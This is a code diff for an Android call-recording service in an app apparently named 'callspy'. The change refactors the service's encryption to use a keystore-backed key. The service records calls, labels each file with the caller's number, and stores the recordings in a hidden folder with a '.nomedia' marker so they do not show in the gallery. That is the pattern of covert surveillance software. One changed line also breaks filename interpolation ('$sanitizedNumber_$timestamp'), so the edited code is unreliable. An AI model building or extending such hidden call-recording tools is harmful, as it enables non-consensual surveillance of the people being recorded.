@@ -13,14 +13,13 @@ import android.os.Environment
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.example.callspy.utils.KeyStoreManager
 import java.io.File
 import java.io.FileOutputStream
 import java.io.IOException
-import java.security.Key
 import java.security.SecureRandom
 import javax.crypto.Cipher
 import javax.crypto.CipherOutputStream
-import javax.crypto.KeyGenerator
 import javax.crypto.spec.IvParameterSpec
 
 class CallRecordingService : Service() {
@@ -28,14 +27,13 @@ class CallRecordingService : Service() {
     private var mediaRecorder: MediaRecorder? = null
     private var outputFilePath: String? = null
     private var encryptedFilePath: String? = null
-    private var encryptionKey: Key? = null
     private var ivSpec: IvParameterSpec? = null
     
     companion object {
         const val CHANNEL_ID = "CallRecordingServiceChannel"
         const val NOTIFICATION_ID = 1
         private const val TAG = "CallRecordingService"
-        
+
         // Audio sources to try (in order of preference)
         private val AUDIO_SOURCES = listOf(
             MediaRecorder.AudioSource.VOICE_COMMUNICATION,
@@ -43,11 +41,9 @@ class CallRecordingService : Service() {
             MediaRecorder.AudioSource.MIC,
             MediaRecorder.AudioSource.DEFAULT
         )
-        
-        // Encryption algorithm
-        private const val ENCRYPTION_ALGORITHM = "AES/CBC/PKCS5Padding"
-        private const val KEY_ALGORITHM = "AES"
-        private const val KEY_SIZE = 256
+
+        // IV size for AES (16 bytes)
+        private const val IV_SIZE = 16
     }
 
     override fun onCreate() {
@@ -58,20 +54,20 @@ class CallRecordingService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "CallRecordingService starting")
-        
+
         // Extract call metadata from intent if available
         val phoneNumber = intent?.getStringExtra("phone_number") ?: "Unknown"
         val isIncoming = intent?.getBooleanExtra("is_incoming", true) ?: true
-        
+
         startForeground(NOTIFICATION_ID, createNotification(phoneNumber, isIncoming))
-        
+
         // Try to start recording with retry logic
         if (!startRecordingWithRetry(phoneNumber, isIncoming)) {
             Log.e(TAG, "Failed to start recording after all attempts")
             stopSelf()
             return START_NOT_STICKY
         }
-        
+
         return START_STICKY
     }
 
@@ -122,7 +118,7 @@ class CallRecordingService : Service() {
 
     private fun startRecordingWithRetry(phoneNumber: String, isIncoming: Boolean): Boolean {
         var lastException: Exception? = null
-        
+
         for (audioSource in AUDIO_SOURCES) {
             try {
                 if (startRecording(audioSource, phoneNumber, isIncoming)) {
@@ -132,30 +128,26 @@ class CallRecordingService : Service() {
             } catch (e: Exception) {
                 lastException = e
                 Log.w(TAG, "Failed to start recording with audio source $audioSource: ${e.message}")
-                // Clean up before trying next source
                 stopRecording()
             }
         }
-        
-        lastException?.let { Log.e(TAG, "All audio sources failed", it) }
+
+        lastException?.let { Log.e(TAG, "All audio sources failed: ${it.message}", it) }
         return false
     }
 
     private fun startRecording(audioSource: Int, phoneNumber: String, isIncoming: Boolean): Boolean {
         try {
-            // Generate encryption key if not already generated
-            if (encryptionKey == null) {
-                encryptionKey = generateEncryptionKey()
-                ivSpec = generateInitializationVector()
-            }
-            
+            // Generate IV for this encryption session
+            ivSpec = generateInitializationVector()
+
             // Create output directory
             val outputDir = getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
             if (outputDir == null) {
                 Log.e(TAG, "Failed to get external files directory")
                 return false
             }
-            
+
             // Create hidden directory for recordings
             val hiddenDir = File(outputDir, ".call_recordings")
             if (!hiddenDir.exists()) {
@@ -163,24 +155,24 @@ class CallRecordingService : Service() {
                 // Create .nomedia file to hide from gallery
                 File(hiddenDir, ".nomedia").createNewFile()
             }
-            
+
             // Generate filename with metadata
             val timestamp = System.currentTimeMillis()
             val callType = if (isIncoming) "incoming" else "outgoing"
             val sanitizedNumber = phoneNumber.replace("[^0-9]".toRegex(), "")
-            val baseFilename = "call_${callType}_${sanitizedNumber}_${timestamp}"
-            
+            val baseFilename = "call_${callType}_$sanitizedNumber_$timestamp"
+
             // Temporary unencrypted file
             val tempFile = File(hiddenDir, "${baseFilename}_temp.mp4")
             outputFilePath = tempFile.absolutePath
-            
+
             // Encrypted file
             val encryptedFile = File(hiddenDir, "${baseFilename}_encrypted.aes")
             encryptedFilePath = encryptedFile.absolutePath
-            
+
             Log.d(TAG, "Starting recording to: $outputFilePath")
             Log.d(TAG, "Will encrypt to: $encryptedFilePath")
-            
+
             mediaRecorder = MediaRecorder().apply {
                 setAudioSource(audioSource)
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
@@ -191,10 +183,10 @@ class CallRecordingService : Service() {
                 prepare()
                 start()
             }
-            
+
             Log.d(TAG, "MediaRecorder started successfully")
             return true
-            
+
         } catch (e: SecurityException) {
             Log.e(TAG, "Security exception: ${e.message}", e)
             throw e
@@ -203,9 +195,6 @@ class CallRecordingService : Service() {
             throw e
         } catch (e: IllegalStateException) {
             Log.e(TAG, "Illegal state: ${e.message}", e)
-            throw e
-        } catch (e: RuntimeException) {
-            Log.e(TAG, "Runtime exception: ${e.message}", e)
             throw e
         }
     }
@@ -224,44 +213,47 @@ class CallRecordingService : Service() {
                 release()
             }
             mediaRecorder = null
-            
+
             // Encrypt the recorded file
             outputFilePath?.let { tempPath ->
-                encryptedFilePath?.let { encryptedPath ->
-                    encryptFile(tempPath, encryptedPath)
+                encryptedFilePath?.let { encPath ->
+                    encryptFile(tempPath, encPath)
                     // Delete temporary unencrypted file
                     File(tempPath).delete()
-                    Log.d(TAG, "File encrypted and temporary file deleted: $encryptedPath")
+                    Log.d(TAG, "File encrypted and temporary file deleted: $encPath")
                 }
             }
-            
+
         } catch (e: Exception) {
             Log.e(TAG, "Error in stopRecording: ${e.message}", e)
         } finally {
             outputFilePath = null
             encryptedFilePath = null
+            ivSpec = null
         }
     }
 
-    private fun generateEncryptionKey(): Key {
-        val keyGenerator = KeyGenerator.getInstance(KEY_ALGORITHM)
-        keyGenerator.init(KEY_SIZE)
-        return keyGenerator.generateKey()
-    }
-
     private fun generateInitializationVector(): IvParameterSpec {
-        val iv = ByteArray(16) // AES block size
+        val iv = ByteArray(IV_SIZE)
         SecureRandom().nextBytes(iv)
         return IvParameterSpec(iv)
     }
 
     private fun encryptFile(inputPath: String, outputPath: String): Boolean {
         return try {
-            val cipher = Cipher.getInstance(ENCRYPTION_ALGORITHM)
+            // Get encryption key from KeyStoreManager
+            val encryptionKey = KeyStoreManager.getOrCreateEncryptionKey()
+            val cipher = Cipher.getInstance(KeyStoreManager.getEncryptionAlgorithm())
             cipher.init(Cipher.ENCRYPT_MODE, encryptionKey, ivSpec)
-            
+
             File(inputPath).inputStream().use { inputStream ->
                 FileOutputStream(outputPath).use { outputStream ->
+                    // Write IV first (16 bytes)
+                    ivSpec?.iv?.let { ivBytes ->
+                        outputStream.write(ivBytes)
+                    }
+                    
+                    // Then write encrypted data
                     CipherOutputStream(outputStream, cipher).use { cipherStream ->
                         inputStream.copyTo(cipherStream)
                     }
@@ -282,7 +274,7 @@ class CallRecordingService : Service() {
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
-        
+
         val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         notificationManager.notify(NOTIFICATION_ID, notification)
     }
